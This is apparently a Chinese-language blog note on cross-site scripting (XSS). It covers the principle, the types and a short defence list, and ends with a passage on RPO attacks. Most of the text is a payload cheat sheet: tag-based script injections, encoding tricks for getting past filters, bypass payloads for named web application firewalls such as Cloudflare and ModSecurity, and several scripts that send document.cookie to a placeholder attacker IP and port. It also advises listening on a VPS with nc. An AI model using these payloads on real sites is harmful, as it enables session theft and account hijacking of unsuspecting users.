title: XSS跨站攻击
author: liuGuobin
tags:
  - 日报
categories:
  - 日报
date: 2023-04-21 14:32:00
---
#### 漏洞原理
   XSS又叫CSS（Cross Site Script）是指恶意攻击者往Web页面里插入恶意Script代码
   当用户`浏览该页`时，其中的Script代码会被执行，从而达到恶意攻击用户的目的。
   xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，所以xss漏洞关键就是寻找参数未过滤的输出函数。
   常见的输出函数有：echo printf print print_r sprintf die var-dump var_export
   
#### 攻击流程
（1）攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）
（2）诱使受害者打开受到攻击的服务器URL
（3）受害者在Web浏览器中打开URL时自动执行恶意脚本

#### 攻击方式
（1）反射型XSS：<非持久化> 
需要欺骗用户自己去点击链接才能触发XSS代码，一般容易出现在搜索页面，由后端代码进行处理。
（2）存储型XSS：<持久化> 
每当有用户访问污染页面的时候都会触发代码执行。代码存储在服务器数据库中，如在个人信息或发表文章等地方。
（3）DOM型XSS：
DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。
DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。
客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行。
如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。
一般是浏览器前端代码进行处理。
***反射和dom的区别: 
DOM-XSS是javascript处理输出， 而反射性xss是后台程序处理***

#### 危害
1.挂马
2.盗取用户Cookie。
3.DOS（拒绝服务）客户端浏览器。
4.钓鱼攻击，高级的钓鱼技巧。
5.删除目标文章、恶意篡改数据、嫁祸。
6.劫持用户Web行为，甚至进一步渗透内网。
7.爆发Web2.0蠕虫。
8.蠕虫式的DDoS攻击。
9.蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据

#### 漏洞利用
**各种标签的XSS形式**
```

<script> 标签用于定义客户端脚本，比如 JavaScript。
<script>alert(1);</script>
<script>alert("xss");</script>

<img> 标签定义 HTML 页面中的图像。
<img src=1 onerror=alert(1);>
<img src=1 onerror=alert("xss");>

<input> 标签规定了用户可以在其中输入数据的输入字段。
onfocus 事件在对象获得焦点时发生：
<input onfocus=alert(1);>
<input onblur=alert(1) autofocus><input autofocus>
<input onfocus="alert(1);" autofocus>
" οnclick=alert(1)>        这样需要点击一下输入框<br>
" onmouseover=alert(1)>    需要鼠标划过输入框<br>

<details> 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭 <details> 元素时触发：
<details ontoggle=alert(1);>

<svg> 标签用来在HTML页面中直接嵌入SVG 文件的代码。
<svg onload=alert(1);>

<select> 标签用来创建下拉列表。
<select onfocus=alert(1)></select
通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：
<select onfocus=alert(1) autofocus>

<iframe> 标签会创建包含另外一个文档的内联框架。
<iframe onload=alert(1);></iframe>

<video> 标签定义视频，比如电影片段或其他视频流。<audio> 标签定义声音，比如音乐或其他音频流。

<audio src=x  onerror=alert(1);>
<video><source onerror=alert(1)>

<body> 标签定义文档的主体。
<body onload=alert(1);>
onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发
<body
onscroll=alert(1);><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>

<textarea> 标签定义一个多行的文本输入控件。
<textarea onfocus=alert(1); autofocus>

<keygen autofocus onfocus=alert(1)> //仅限火狐

<marquee onstart=alert(1)></marquee> //Chrome不行，火狐和IE都可以

<isindex type=image src=1 onerror=alert(1)>//仅限于IE

```
**绕过过滤方法**
```
【大小写】

【没有分号】

【Flash】

【Fuzz进行测试】

【双层标签绕过】

【空格过滤】
/**/注释符号绕过
/符号绕过

【引号过滤】
如果是html标签中，可以不用引号
在js中，可以用反引号代替单双引号

【括号过滤】
使用throw绕过
 throw 语句用于当错误发生时抛出一个错误

【关键字过滤】
大小写绕过
双写绕过
字符串拼接绕过（利用eval()函数）
在js中用反引号代替单双引号
编码绕过
	Unicode编码绕过
	<img src="x" onerror="&#97;">
	javasc&#x72;&#x69;pt:alert(/xss/)          (编码了r和i)
	<img src="x" onerror="eval('\u0061')">
	url编码绕过
	<img src="x" onerror="eval(unescape('%61'))">
	<iframe src="data:text/html,%3C"></iframe>
	Ascii码绕过
	<img src="x" onerror="eval(String.fromCharCode(97,108))">
	hex绕过
	<img src=x onerror=eval('\x61')>
	base64绕过
	<img src="x" onerror="eval(atob('XXXXX=='))">
	<iframe src="data:text/html;base64,XXXXX==">

【过滤url地址】
使用url编码
	<img src="x" onerror=document.location=`http://%77/`>
	javasc&#x72;&#x69;pt:alert('xsshttp://')
使用IP
	十进制IP
	<img src="x" onerror=document.location=`http://2130706433/`>
	八进制IP
	<img src="x" onerror=document.location=`http://0177.0.0.01/`>
	十六进制IP
	<img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>
	html标签中用//代替http://
	<img src="x" onerror=document.location=`//www.baidu.com`>
	使用\\
    使用中文逗号代替英文逗号
	<img src="x" onerror="document.location=`http:\\www。baidu。com`">

【单引号闭合+htmlspecialchars函数绕过】
'onmouseover='alert(/xss/)

【JavaScript伪协议】
"><a href=javascript:alert(/xss/)>                  o_n和<scr_ipt>过滤

【HttpOnly绕过】
什么是HttpOnly？
cookie中设置了HttpOnly属性后js脚本将无法读取到cookie信息
但是使用下面这样仍然可以读取
Cookie cookies[]=request.getCookies();

【其它waf绕过思路】
（1）标签语法替换
<scr<script>ipt>alert("XSS")</scr<script>ipt>
<script src="http://xxx/"></script>
（2）特殊符号干扰
（3）提交方式更改
（4）垃圾数据溢出
（5）加密解密算法
（6）结合其他漏洞绕过

```

#### 结合其他漏洞绕过
```

WAF名称：Cloudflare
Payload：<a”/onclick=(confirm)()>click
绕过技术：非空格填充

WAF名称：Wordfence
Payload：<a/href=javascript&colon;alert()>click
绕过技术：数字字符编码

WAF名称：Barracuda
Payload：<a/href=Java%0a%0d%09script&colon;alert()>click
绕过技术：数字字符编码

WAF名称：Comodo
Payload：<d3v/onauxclick=(((confirm)))“>click
绕过技术：黑名单中缺少事件处理器以及函数调用混淆

WAF名称：F5
Payload：<d3v/onmouseleave=[2].some(confirm)>click
绕过技术：黑名单中缺少事件处理器以及函数调用混淆

WAF名称：ModSecurity
Payload：<details/open/ontoggle=alert()>
绕过技术：黑名单中缺少标签或事件处理器

WAF名称：dotdefender
Payload：<details/open/ontoggle=(confirm)()//
绕过技术：黑名单中缺少结束标签、事件处理器和函数调用混淆

```

#### 还有一些很重要的东西
xss网站最好自己搭建一个，因为可能会过滤xss关键字
最好使用只带有数字的域名或ip
利用vps，用nc端口监听


#### XSStrike工具使用
[**使用说明**](https://blog.csdn.net/RuoLi_s/article/details/113192507?ops_request_misc=&request_id=&biz_id=102&utm_term=XSStrike&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-113192507.nonecase&spm=1018.2226.3001.4187)

#### XSS的防御措施
（1）编码：对输入内容的特定字符进行编码，例如表示html标记的 < > 等符号
（2）过滤：移除用户上传的DOM属性，如onerror等，移除用户上传的style节点，script节点，iframe节点等。
（3）校正：避免直接对HTML Entity编码，使用DOM Prase转换，校正不配对的DOM标签。
（4）配置：对重要的cookie设置httpOnly, 防止客户端通过document.cookie读取 cookie
（5）不要使用Eval来解析并运行不确定的数据或代码，对于JSON解析请使用 JSON.parse()
方法。

#### 各种姿势
```

<script>window.open('http://你的公网ip:端口号/'+document.cookie)</script>

<script>var img = document.createElement("img");img.src = "http://你的公网ip:端口号/?cookie="+document.cookie;</script>

<script>window.location.href='http://你的公网ip:端口号/'+document.cookie</script>

<script>location.href='http://你的公网ip:端口号/'+document.cookie</script>

<input onfocus="window.open('http://你的公网ip:端口号/'+document.cookie)" autofocus>

<svg onload="window.open('http://你的公网ip:端口号/'+document.cookie)">

<iframe onload="window.open('http://你的公网ip:端口号/'+document.cookie)"></iframe>

<body onload="window.open('http://你的公网ip:端口号/'+document.cookie)">

```


### RPO 攻击
#### 原理
由于**Apache 服务器对编码后的 url 不能正常解析，而 Nginx 却可以正常解析。**
（Apache 服务器不能解析%2f 是默认配置问题，可见：链接包含”%2F”导致mod_rewrite失效）
假设现在有2个目录分别为aaa目录和bbb目录，利用浏览器与服务器对特殊构造的url的解析差异
能够让获取了aaa目录下的文件的浏览器误以为自己在bbb目录。
当aaa下的文件出现了相对路径的文件引用的时候，浏览器会去读取bbb目录下的该文件，从而造成了漏洞的产生。
目前来看此攻击方法依赖于浏览器和网络服务器的反应
基于服务器的Web缓存技术和配置差异，以及服务器和客户端浏览器的解析差异
利用前端代码中加载的css/js的相对路径来加载其他文件
最终浏览器将服务器返回的不是css/js的文件当做css/js来解析
从而导致XSS，信息泄露等漏洞产生。